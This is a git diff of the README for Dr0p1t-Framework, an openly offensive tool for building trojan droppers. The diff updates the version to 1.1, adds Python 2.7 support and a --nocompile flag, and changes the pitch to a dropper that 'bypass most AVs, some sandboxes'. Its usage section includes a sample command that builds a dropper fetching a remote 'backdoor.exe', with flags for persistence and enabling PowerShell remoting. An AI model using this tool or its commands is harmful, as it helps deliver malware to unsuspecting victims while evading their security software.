@@ -1,9 +1,9 @@
-# Dr0p1t-Framework (beta version) [![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/) ![Build Status](https://img.shields.io/badge/Version-1.0.1-red.svg)
-###### Version 1.0.1 , see CHANGELOG.md file
+# Dr0p1t-Framework ![Stage](https://img.shields.io/badge/Release-STABLE-brightgreen.svg) [![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/) [![Python 2.7](https://img.shields.io/badge/Python-2.7-yellow.svg)](http://www.python.org/download/) ![Build Status](https://img.shields.io/badge/Version-1.1-red.svg)
+###### Version 1.1 , see CHANGELOG.md file
 
 Have you ever heard about trojan droppers ? you can read about them from [here](https://blog.malwarebytes.com/threats/trojan-dropper/).
 
-Dr0p1t let you create dropper like any tool but this time FUD with some tricks ;)
+Dr0p1t let you create a dropper that bypass most AVs, some sandboxes and have some tricks ;)
 
 # Features
 - Works with Windows and Linux
@@ -15,7 +15,7 @@ Dr0p1t let you create dropper like any tool but this time FUD with some tricks ;
 - Using UPX to compress the dropper after creating it
 - Choose an icon for the dropper after creating it
 
-# Screenshots
+# Screenshots ( Not always updated )
 ## On Windows
 <img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Windows/Random2.JPG" width="55%"></img>
 
@@ -42,6 +42,7 @@ options:
   --only32     Download your malware for 32 bit devices only
   --only64     Download your malware for 64 bit devices only
   --upx        Use UPX to compress the final file.
+  --nocompile  Tell the framework to not compile the final file.
   -i           Use icon to the final file. Check icons folder.
   -q           Stay quite ( no banner )
   -u           Check for updates
@@ -54,7 +55,7 @@ options:
 ./Dr0p1t.py https://test.com/backdoor.exe -s -t -k -p Enable_PSRemoting.ps1
 ```
 # Prerequisites
-- Python 3.x( prefered 3.5 and don't use 3.6 because it's not supported yet by PyInstaller )
+- Python 3.x or 2.7 ( prefered 3.5 and don't use 3.6 because it's not supported yet by PyInstaller )
 - Python libraries requirements in requirements.txt
 
 # Installation
